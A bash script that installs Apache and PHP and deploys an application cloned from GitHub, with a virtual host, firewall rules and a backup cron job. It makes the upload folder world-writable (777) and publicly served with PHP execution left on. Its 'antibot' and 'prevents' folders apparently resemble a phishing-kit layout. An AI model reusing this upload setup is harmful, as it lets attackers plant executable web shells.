#!/bin/bash

# PHP Application Deployment Script for Apache
# Run this script as root or with sudo

set -e

echo "🚀 Starting PHP Application Deployment with Apache..."

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Function to print colored output
print_status() {
    echo -e "${GREEN}[INFO]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Check if running as root
if [ "$EUID" -ne 0 ]; then
    print_error "Please run this script as root or with sudo"
    exit 1
fi

# Get domain name from user
read -p "Enter your domain name (e.g., example.com): " DOMAIN_NAME
if [ -z "$DOMAIN_NAME" ]; then
    print_error "Domain name is required"
    exit 1
fi

print_status "Deploying for domain: $DOMAIN_NAME"

# Step 1: Update system
print_status "Updating system packages..."
apt update && apt upgrade -y

# Step 2: Install dependencies
print_status "Installing Apache, PHP, and dependencies..."
apt install -y apache2 php8.1 libapache2-mod-php8.1 php8.1-cli php8.1-common php8.1-mysql php8.1-zip php8.1-gd php8.1-mbstring php8.1-curl php8.1-xml php8.1-bcmath php8.1-json git

# Step 3: Enable Apache modules
print_status "Enabling Apache modules..."
a2enmod rewrite
a2enmod ssl
a2enmod headers
a2enmod php8.1

# Step 4: Configure PHP
print_status "Configuring PHP..."
sed -i 's/upload_max_filesize = 2M/upload_max_filesize = 100M/' /etc/php/8.1/apache2/php.ini
sed -i 's/post_max_size = 8M/post_max_size = 100M/' /etc/php/8.1/apache2/php.ini
sed -i 's/max_execution_time = 30/max_execution_time = 300/' /etc/php/8.1/apache2/php.ini
sed -i 's/memory_limit = 128M/memory_limit = 256M/' /etc/php/8.1/apache2/php.ini

# Step 5: Create web directory and clone repository
print_status "Setting up application directory..."
mkdir -p /var/www/html/comm
cd /var/www/html/comm

# Clone repository
print_status "Cloning application from GitHub..."
git clone https://github.com/kamrankamrankhan/comm.git .

# Set permissions
print_status "Setting proper permissions..."
chown -R www-data:www-data /var/www/html/comm
chmod -R 755 /var/www/html/comm
chmod -R 777 /var/www/html/comm/views/xentryxupload/

# Step 6: Configure Apache virtual host
print_status "Configuring Apache virtual host..."
cat > /etc/apache2/sites-available/comm.conf << EOF
<VirtualHost *:80>
    ServerName $DOMAIN_NAME
    ServerAlias www.$DOMAIN_NAME
    DocumentRoot /var/www/html/comm
    
    # Security headers
    Header always set X-Frame-Options "SAMEORIGIN"
    Header always set X-XSS-Protection "1; mode=block"
    Header always set X-Content-Type-Options "nosniff"
    Header always set Referrer-Policy "no-referrer-when-downgrade"
    Header always set Content-Security-Policy "default-src 'self' http: https: data: blob: 'unsafe-inline'"
    
    # Hide Apache version
    ServerTokens Prod
    ServerSignature Off
    
    # Directory configuration
    <Directory /var/www/html/comm>
        Options -Indexes +FollowSymLinks
        AllowOverride All
        Require all granted
        
        # PHP settings
        php_value upload_max_filesize 100M
        php_value post_max_size 100M
        php_value max_execution_time 300
        php_value memory_limit 256M
    </Directory>
    
    # Deny access to sensitive directories
    <Directory /var/www/html/comm/config>
        Require all denied
    </Directory>
    
    <Directory /var/www/html/comm/antibot>
        Require all denied
    </Directory>
    
    <Directory /var/www/html/comm/prevents>
        Require all denied
    </Directory>
    
    # Allow uploads directory
    <Directory /var/www/html/comm/views/xentryxupload>
        Options -Indexes
        AllowOverride None
        Require all granted
    </Directory>
    
    # Deny access to sensitive files
    <FilesMatch "\.(bak|backup|old|tmp|temp|log|ini|conf)$">
        Require all denied
    </FilesMatch>
    
    <FilesMatch "^\.">
        Require all denied
    </FilesMatch>
    
    # Static files caching
    <LocationMatch "\.(jpg|jpeg|png|gif|ico|css|js|pdf|txt)$">
        ExpiresActive On
        ExpiresDefault "access plus 1 year"
        Header append Cache-Control "public"
    </LocationMatch>
    
    # Error and access logs
    ErrorLog \${APACHE_LOG_DIR}/comm_error.log
    CustomLog \${APACHE_LOG_DIR}/comm_access.log combined
    
    # Log level
    LogLevel warn
</VirtualHost>
EOF

# Enable site and disable default
print_status "Enabling Apache site..."
a2ensite comm.conf
a2dissite 000-default.conf

# Test Apache configuration
print_status "Testing Apache configuration..."
apache2ctl configtest

# Step 7: Configure firewall
print_status "Configuring firewall..."
ufw allow 22/tcp
ufw allow 80/tcp
ufw allow 443/tcp
ufw --force enable

# Step 8: Start and enable Apache
print_status "Starting Apache..."
systemctl restart apache2
systemctl enable apache2

# Step 9: Create backup script
print_status "Creating backup script..."
cat > /usr/local/bin/backup-comm.sh << 'EOF'
#!/bin/bash
BACKUP_DIR="/var/backups/comm"
DATE=$(date +%Y%m%d_%H%M%S)
mkdir -p $BACKUP_DIR

# Backup application files
tar -czf $BACKUP_DIR/comm_backup_$DATE.tar.gz -C /var/www/html comm

# Keep only last 7 days of backups
find $BACKUP_DIR -name "comm_backup_*.tar.gz" -mtime +7 -delete

echo "Backup completed: comm_backup_$DATE.tar.gz"
EOF

chmod +x /usr/local/bin/backup-comm.sh

# Add to crontab for daily backups
(crontab -l 2>/dev/null; echo "0 2 * * * /usr/local/bin/backup-comm.sh") | crontab -

print_status "✅ Deployment completed successfully!"
print_status "🌐 Your application is now accessible at: http://$DOMAIN_NAME"
print_warning "📝 Next steps:"
print_warning "1. Point your domain DNS to this server's IP address"
print_warning "2. Install SSL certificate: certbot --apache -d $DOMAIN_NAME"
print_warning "3. Re-enable security restrictions in /var/www/html/comm/prevents/genius.php"
print_warning "4. Test all application functionality"

# Show service status
print_status "Service status:"
systemctl status apache2 --no-pager -l

echo ""
print_status "🎉 Deployment script completed!"
